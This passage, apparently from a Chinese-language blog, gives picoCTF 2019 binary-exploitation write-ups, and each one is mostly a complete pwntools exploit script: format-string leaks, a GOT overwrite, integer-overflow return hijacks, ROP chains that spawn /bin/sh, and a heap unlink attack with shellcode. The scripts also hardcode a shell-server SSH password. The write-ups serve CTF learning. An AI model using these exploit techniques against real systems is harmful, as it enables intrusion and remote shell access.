class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"your command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"print-flag"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"your command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"login"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"of your username"</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">"enter your username"</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"your command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"logout"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"aaaaaaaa"</span> + p64(<span class="number">0x4343415F544F4F52</span>) + p64(<span class="number">0x45444F435F535345</span>)</span><br><span class="line">login(<span class="number">32</span>,payload)</span><br><span class="line">logout()</span><br><span class="line">login(<span class="number">32</span>,<span class="string">'kangel'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print_flag()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_64bcc6a3}</code></p>
+<h4 id="stringzz"><a href="#stringzz" class="headerlink" title="stringzz"></a>stringzz</h4><p>程序分析：将flag写进内存，直接爆破吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/stringzz_0_973c705187166a133a5293d2fc93b552"</span>)</span><br><span class="line"><span class="comment">#p = s.process("./vuln")</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):<span class="comment">#37</span></span><br><span class="line">	p=s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"back:\n"</span>)</span><br><span class="line">	payload = <span class="string">'%&#123;&#125;$s'</span>.format(i)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	data = p.recvall()</span><br><span class="line">	p.close()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'pico'</span> <span class="keyword">in</span> data:</span><br><span class="line">		<span class="keyword">print</span> data</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{str1nG_CH3353_b7f47023}</code></p>
+<h4 id="GoT"><a href="#GoT" class="headerlink" title="GoT"></a>GoT</h4><p>查看保护</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] checksec <span class="keyword">for</span> <span class="string">'/mnt/hgfs/shared/picoCTF/got/vuln'</span></span><br><span class="line">Canary                        : Yes</span><br><span class="line">NX                            : Yes</span><br><span class="line">PIE                           : No</span><br><span class="line">Fortify                       : No</span><br><span class="line">RelRO                         : Partial <span class="comment">##got表可写</span></span><br></pre></td></tr></table></figure>
+<p>思路很简单，覆写got表即可，将exit的地址换成win</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/got_4_97e6bb0e913c179989678416d8a8fb22"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">exit_got = elf.got[<span class="string">'exit'</span>]</span><br><span class="line">win_addr = elf.sym[<span class="string">'win'</span>]</span><br><span class="line"><span class="keyword">print</span> exit_got</span><br><span class="line"><span class="keyword">print</span> win_addr</span><br><span class="line">p.recvuntil(<span class="string">"address\n"</span>)</span><br><span class="line">p.sendline(str(exit_got))</span><br><span class="line">p.recvuntil(<span class="string">"value?\n"</span>)</span><br><span class="line">p.sendline(str(win_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}</code></p>
+<h4 id="pointy"><a href="#pointy" class="headerlink" title="pointy"></a>pointy</h4><p>程序逻辑漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/pointy_2_030e643c8a0e842516b1c6a3ff826144"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">win_addr = elf.sym[<span class="string">'win'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"name of a student"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"professor of a student "</span>)</span><br><span class="line">p.sendline(<span class="string">'bbbb'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"give the score "</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"will be scored "</span>)</span><br><span class="line">p.sendline(<span class="string">"bbbb"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input the score: "</span>)</span><br><span class="line">p.sendline(str(win_addr))</span><br><span class="line">p.recvuntil(<span class="string">"name of a student"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbbb"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"professor of a student "</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"give the score "</span>)</span><br><span class="line">p.sendline(<span class="string">'bbbb'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"will be scored "</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input the score: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">100</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="seed-spring"><a href="#seed-spring" class="headerlink" title="seed_spring"></a>seed_spring</h4><p>利用ctypes生成一样的随机序列，本地与服务器可能会有延迟，测试延迟范围脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-10</span>,<span class="number">10</span>) :</span><br><span class="line">	p = remote(<span class="string">"2019shell1.picoctf.com"</span>,<span class="string">"4160"</span>)</span><br><span class="line">	seed = libc.time(<span class="number">0</span>)</span><br><span class="line">	libc.srand(seed+i)</span><br><span class="line">	<span class="keyword">print</span> i</span><br><span class="line">	p.recvuntil(<span class="string">"height: "</span>)</span><br><span class="line">	p.sendline(str(libc.rand()&amp;<span class="number">0xf</span>))</span><br><span class="line">	data = p.recvline()</span><br><span class="line">	<span class="keyword">print</span> data</span><br><span class="line">	p.close()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"LEVEL"</span> <span class="keyword">in</span> data:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="comment"># p = process("./seed_spring")</span></span><br><span class="line">p = remote(<span class="string">"2019shell1.picoctf.com"</span>,<span class="string">"4160"</span>)</span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">delay = <span class="number">7</span>  <span class="comment">#延迟5到10秒，具体看网速</span></span><br><span class="line">libc.srand(seed - delay)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>) :</span><br><span class="line">	p.recvuntil(<span class="string">"height: "</span>)</span><br><span class="line">	p.sendline(str(libc.rand()&amp;<span class="number">0xf</span>))</span><br><span class="line">	data = p.recvline()</span><br><span class="line">	<span class="keyword">print</span> data</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{pseudo_random_number_generator_not_so_random_24ce919be49576c7df453a4a3e6fbd40}</code></p>
+<h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>整数溢出，首先判断溢出的位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gef➤  </span><br><span class="line">0x0804865e <span class="keyword">in</span> replaceIntegerInArrayAtIndex ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="variable">$eax</span>   : 0x64      </span><br><span class="line"><span class="variable">$ebx</span>   : 0x0804a000  →  0x08049f0c  →  0x00000001</span><br><span class="line"><span class="variable">$ecx</span>   : 0x1       </span><br><span class="line"><span class="variable">$edx</span>   : 0xffffc378  →  0x00000064 (<span class="string">"d"</span>?)</span><br><span class="line"><span class="variable">$esp</span>   : 0xffffc388  →  0xffffce18  →  0x00000000</span><br><span class="line"><span class="variable">$ebp</span>   : 0xffffc388  →  0xffffce18  →  0x00000000</span><br><span class="line"><span class="variable">$esi</span>   : 0xf7fb0000  →  0x001d7d6c (<span class="string">"l&#125;"</span>?)</span><br><span class="line"><span class="variable">$edi</span>   : 0x0       </span><br><span class="line"><span class="variable">$eip</span>   : 0x0804865e  →  &lt;replaceIntegerInArrayAtIndex+33&gt; nop </span><br><span class="line"><span class="variable">$eflags</span>: [CARRY PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x0023 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x002b <span class="variable">$es</span>: 0x002b <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffc388│+0x0000: 0xffffce18  →  0x00000000	 ← <span class="variable">$esp</span>, <span class="variable">$ebp</span></span><br><span class="line">0xffffc38c│+0x0004: 0x080486fc  →  &lt;main+155&gt; add esp, 0x10   <span class="comment">##返回值地址0xffffc38c</span></span><br><span class="line">0xffffc390│+0x0008: 0xffffc3a0  →  0x00000000</span><br><span class="line">0xffffc394│+0x000c: 0xfffffff6</span><br><span class="line">0xffffc398│+0x0010: 0x00000064 (<span class="string">"d"</span>?)</span><br><span class="line">0xffffc39c│+0x0014: 0x0804867b  →  &lt;main+26&gt; add ebx, 0x1985</span><br><span class="line">0xffffc3a0│+0x0018: 0x00000000</span><br><span class="line">0xffffc3a4│+0x001c: 0x00000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048653 &lt;replaceIntegerInArrayAtIndex+22&gt; add    BYTE PTR [ebx-0x3dfef7bb], cl</span><br><span class="line">    0x8048659 &lt;replaceIntegerInArrayAtIndex+28&gt; mov    eax, DWORD PTR [ebp+0x10]</span><br><span class="line">    0x804865c &lt;replaceIntegerInArrayAtIndex+31&gt; mov    DWORD PTR [edx], eax</span><br><span class="line"> →  0x804865e &lt;replaceIntegerInArrayAtIndex+33&gt; nop    </span><br><span class="line">    0x804865f &lt;replaceIntegerInArrayAtIndex+34&gt; pop    ebp</span><br><span class="line">    0x8048660 &lt;replaceIntegerInArrayAtIndex+35&gt; ret    </span><br><span class="line">    0x8048661 &lt;main+0&gt;         lea    ecx, [esp+0x4]</span><br><span class="line">    0x8048665 &lt;main+4&gt;         and    esp, 0xfffffff0</span><br><span class="line">    0x8048668 &lt;main+7&gt;         push   DWORD PTR [ecx-0x4]</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[<span class="comment">#0] Id 1, Name: "vuln", stopped, reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[<span class="comment">#0] 0x804865e → replaceIntegerInArrayAtIndex()</span></span><br><span class="line">[<span class="comment">#1] 0x80486fc → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/2wx 0xffffce08-0xa68-40  <span class="comment">##输入-10进行计算</span></span><br><span class="line">0xffffc378:	0x00000064	0x0804a000</span><br><span class="line">gef➤  x/2wx 0xffffce08-0xa68-24</span><br><span class="line">0xffffc388:	0xffffce18	0x080486fc</span><br><span class="line">gef➤  x/2wx 0xffffce08-0xa68-20  <span class="comment">##溢出长度为-（20/4=5)</span></span><br><span class="line">0xffffc38c:	0x080486fc	0xffffc3a0</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/l1im1tl355_1_688adedb3c25bf76cbb2c2a0fe7e9ac3"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="keyword">print</span> elf.sym[<span class="string">'win'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"array\n"</span>)</span><br><span class="line">p.sendline(str(elf.sym[<span class="string">'win'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">"value\n"</span>)</span><br><span class="line">p.sendline(str(<span class="number">-5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{str1nG_CH3353_59c3cf5a}</code></p>
+<h4 id="rop32"><a href="#rop32" class="headerlink" title="rop32"></a>rop32</h4><p>32位的系统调用，一般用execve(“/bin/sh”,0,0)获取shell</p>
+<p>define __NR_execve 11</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">get_shell:</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line">    push 0x0068732f  ;/sh</span><br><span class="line">    push 0x6e69622f  ;/bin</span><br><span class="line">    mov ebx,esp      ;参数1</span><br><span class="line">    mov eax,0x0b     ;将系统调用号传给eax</span><br><span class="line">    mov ecx,0        ;参数2</span><br><span class="line">    mov edx,0        ;参数3</span><br><span class="line">    int 0x80         ;系统调用指令</span><br><span class="line">    mov eax, 0</span><br><span class="line">    pop ebp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
+<p>思路：先将”/bin/sh”写到.bss段中，再利用rop完成系统调用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/rop32_0_b4142d4df31cb73e170c77dac234a79a"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">gets_addr = elf.sym[<span class="string">'gets'</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">bss_addr = <span class="number">0x080DBFC4</span></span><br><span class="line">pop_eax_edx_ebx_ret = <span class="number">0x08056334</span>  <span class="comment">#ROPgadget --binary vuln --only "pop|ret" |grep 'eax'</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806ee91</span>  <span class="comment">#ROPgadget --binary vuln --only "pop|ret" |grep 'ebx'</span></span><br><span class="line">int_0x80 = <span class="number">0x08049563</span>  ROPgadget --binary vuln --only <span class="string">"int"</span></span><br><span class="line">p.recvuntil(<span class="string">"this one?"</span>)</span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">'a'</span> + <span class="string">'aaaa'</span> + p32(gets_addr) + p32(main_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"this one?"</span>)</span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">'a'</span> + <span class="string">'aaaa'</span> + p32(pop_eax_edx_ebx_ret) + p32(<span class="number">0xb</span>) + p32(<span class="number">0</span>) + p32(bss_addr) </span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x080DBFC4</span>) + p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{rOp_t0_b1n_sH_01a585a7}</code></p>
+<h4 id="rop64"><a href="#rop64" class="headerlink" title="rop64"></a>rop64</h4><p>64位的系统调用，一般用execve(“/bin/sh”,0,0)获取shell</p>
+<p>define __NR_execve 59</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">get_shell:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    mov rax,0x0068732f6e69622f ;/bin/sh</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi,rsp  ;参数1</span><br><span class="line">    mov rax,59   ;将系统调用号传给eax</span><br><span class="line">    mov rsi,0    ;参数2</span><br><span class="line">    mov rdx,0    ;参数3</span><br><span class="line">    syscall      ;系统调用指令</span><br><span class="line">    mov rax, 0</span><br><span class="line">    pop rbp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
+<p>思路：先将”/bin/sh”写到.bss段中，再利用rop完成系统调用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/rop64_4_a266556e68202c0c42d6c14f6c7102b3"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">gets_addr = elf.sym[<span class="string">'gets'</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">bss_addr = <span class="number">0x00000000006BB2D8</span></span><br><span class="line">pop_rax = <span class="number">0x00000000004156f4</span>  <span class="comment">#ROPgadget --binary vuln --only "pop|ret" |grep 'rax'</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400686</span></span><br><span class="line">pop_rdx_rsi = <span class="number">0x000000000044bf39</span></span><br><span class="line">syscall = <span class="number">0x000000000047b6ff</span>  <span class="comment">#ROPgadget --binary vuln --only "syscall"</span></span><br><span class="line">p.recvuntil(<span class="string">"out of this?"</span>)</span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">'a'</span> + p64(pop_rdi) + p64(bss_addr) + p64(gets_addr) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"out of this?"</span>)</span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">'a'</span> + p64(pop_rax) + p64(<span class="number">59</span>) + p64(pop_rdi) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_5e28dda5}</code></p>
+<h4 id="AfterLife"><a href="#AfterLife" class="headerlink" title="AfterLife"></a>AfterLife</h4><p>通过ida和gdb调试可以发现这道题的堆管理机制不是标准的libc2.27堆管理机制，缺少一些检查。因此可以利用没有检查机制的unlink进行攻击。即使</p>
+<p>FD=P-&gt;fd = target addr -12</p>
+<p>BK=P-&gt;bk = expect value</p>
+<p>这样，unlink之后</p>
+<p>FD-&gt;bk = BK 即 target addr -12+12=expect value</p>
+<p>这里expect value直接设置为shellcode地址会报段错误，因此需要跳转一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/afterlife_3_d7ce2f2a99c4a2a922485a042076039f"</span>)</span><br><span class="line">p = s.process(argv=[<span class="string">'./vuln'</span>, <span class="string">"kangel"</span>])</span><br><span class="line"><span class="comment"># p = process(argv=['./vuln', "kangel"])</span></span><br><span class="line">dest = int(p.recvuntil(<span class="string">'you'</span>).split(<span class="string">'\n'</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> hex(dest)</span><br><span class="line">exit_got = <span class="number">0x804d02c</span></span><br><span class="line">payload = p32(exit_got<span class="number">-12</span>) </span><br><span class="line">payload += p32(dest+<span class="number">8</span>)</span><br><span class="line">payload += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">  jmp sc</span></span><br><span class="line"><span class="string">  &#123;&#125;</span></span><br><span class="line"><span class="string">sc:</span></span><br><span class="line"><span class="string">  nop</span></span><br><span class="line"><span class="string">  '''</span>.format(<span class="string">'nop\n'</span>*<span class="number">100</span>)+shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{what5_Aft3r_e5e05866}</code></p>
+<h4 id="SecondLife"><a href="#SecondLife" class="headerlink" title="SecondLife"></a>SecondLife</h4><p>如法炮制afterlife</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># s=ssh(host="2019shell1.picoctf.com",user="kangel",password="2314838574", port=22)</span></span><br><span class="line"><span class="comment"># s.set_working_directory("/problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53")</span></span><br><span class="line"><span class="comment"># p = s.process("./vuln")</span></span><br><span class="line">p = process(<span class="string">"./vuln"</span>)</span><br><span class="line">dest = int(p.recv().split(<span class="string">'\n'</span>)[<span 